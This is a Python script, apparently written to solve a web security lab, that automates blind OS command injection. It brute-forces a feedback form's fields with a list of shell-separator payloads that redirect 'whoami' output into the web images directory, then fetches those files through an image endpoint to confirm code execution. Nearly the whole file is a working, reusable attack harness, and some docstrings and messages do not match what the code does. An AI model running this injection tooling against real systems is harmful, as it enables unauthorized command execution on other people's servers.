#!/usr/bin/env python3
import argparse
import time
from pprint import pprint
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

# -----------------------------
# Config some params here
# -----------------------------

FEEDBACK_PATH = "/feedback"
SUBMIT_FEEDBACK_PATH = "/feedback/submit"
GET_FILE_PATH = "/image?filename="

# Baseline values for feedback form
BASE_FORM_DATA = {
    "name": "test",
    "email": "test@example.com",
    "subject": "test subject",
    "message": "test message",
}

# Parameters we want to brute force (Sniper mode)
PARAMS_TO_TEST = ["name", "email", "subject", "message"]

# Payload used for output redirection (URL-encodes automatically while sending request)
WHOAMI_PAYLOAD = "whoami > /var/www/images/test_file.txt"

# raw symbols without URL-encoding
payload_base_list = [
    ";<PAYLOAD>",
    "&<PAYLOAD>",
    "&&<PAYLOAD>",
    "|<PAYLOAD>",
    "||<PAYLOAD>",
    "\n<PAYLOAD>",  # URL-encoded version is "%0a<PAYLOAD>"
    "$(<PAYLOAD>",
    "`<PAYLOAD>",
    ";<PAYLOAD>;",
    "&<PAYLOAD>&",
    "&&<PAYLOAD>&&",
    "|<PAYLOAD>|",
    "||<PAYLOAD>||",
    "\n<PAYLOAD>\n",  # URL-encoded version is "%0a<PAYLOAD>%0a"
    "<PAYLOAD>",
    "$(<PAYLOAD>)"
]

def get_csrf_from_html(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if not token or not token.get("value"):
        raise RuntimeError("CSRF token not found on forgot-password page.")
    return token["value"]


def send_feedback(session: requests.Session, base_url: str, data: dict) -> float:
    """Send POST /feedback/submit and return response time (seconds)."""
    submit_url = urljoin(base_url, SUBMIT_FEEDBACK_PATH)
    r = session.post(submit_url, data=data, timeout=20, verify=False)
    r.raise_for_status()


def fetch_whoami_file(session: requests.Session, base_url: str, file_to_get: str):
    """Send POST /feedback/submit and return response time (seconds)."""
    get_file_url = urljoin(base_url, f"{GET_FILE_PATH}{file_to_get}")
    r = session.get(get_file_url, timeout=10, verify=False)
    r.raise_for_status()
    return r.status_code

def list_whoami_files(
    session: requests.Session,
    base_url: str,
    params_to_test: list,
):
    """
    Get through files with whoami output to confirm exploitation
    """

    counter = 1
    status = 405
    for i in enumerate(params_to_test):
        for j in enumerate(payload_base_list):
            file_to_get = f"test_file{counter}.txt"

            print(f"[*] Fetching file '{file_to_get}'...")
            try:
                status = fetch_whoami_file(session, base_url, file_to_get)
                print(f"status: {status}")
            except Exception as e:
                print(f"[*] Exception: '{e}'")
            counter += 1
            if status in (200, 204):
                print(f" [*] Successful exploitation for payload{counter}, file {file_to_get}")


def sniper_attack(
    session: requests.Session,
    base_url: str,
    base_data: dict,
    params_to_test,
    payload: str,
    csrf_token: str,
    send_method
):
    """
    Intruder-like Sniper attack:
    - For each parameter in params_to_test:
      - Insert payload only into that parameter
      - Send a request
    """

    print("[*] Starting Sniper attack...")
    counter = 1
    for param in params_to_test:
        for payload_base in payload_base_list:
            # Clone base data each time
            data = base_data.copy()

            data["csrf"] = csrf_token

            # Inject payload into current param
            original_value = data.get(param, "")
            payload_with_number = payload.replace("test_file", f"test_file{counter}")
            injected_value = original_value + payload_base.replace("<PAYLOAD>", payload_with_number)
            data[param] = injected_value
            counter += 1

            print(f"[*] Testing param '{param}' with payload '{injected_value}'...")
            try:
                send_method(session, base_url, data)
            except Exception as e:
                print(f"[*] Exception: '{e}'")


def main():
    parser = argparse.ArgumentParser(
        description="Lab: Blind OS command injection with out-of-band interaction"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    print(f"[*] Base URL: {base_url}")
    print("[*] Running output redirection Sniper attack...\n")

    # Step 1: Getting csrf token from /feedback page
    print("[*] Extracting csrf token...\n")
    feedback_url = urljoin(base_url, "/feedback")
    r = sess.get(feedback_url, timeout=10)
    csrf_token = get_csrf_from_html(r.text)
    print(f"[*] csrf token is {csrf_token}\n")

    # Step 2: Performing parameter brute force (with Intruder-like method)
    print("[*] Performing parameter brute force...\n")
    sniper_attack(
        session=sess,
        base_url=base_url,
        base_data=BASE_FORM_DATA,
        params_to_test=PARAMS_TO_TEST,
        payload=WHOAMI_PAYLOAD,
        csrf_token=csrf_token,
        send_method=send_feedback
    )
    print("\n[+] Brute force finished.")


    # Step 3: Exploit 10 sec delay
    print("[*] Performing final exploitation with 10 sec delay...\n")
    list_whoami_files(
        session=sess,
        base_url=base_url,
        params_to_test=PARAMS_TO_TEST
    )
    print("[+] Exploit payload sent. Now checkout in the browser to complete the lab.")


if __name__ == "__main__":
    main()
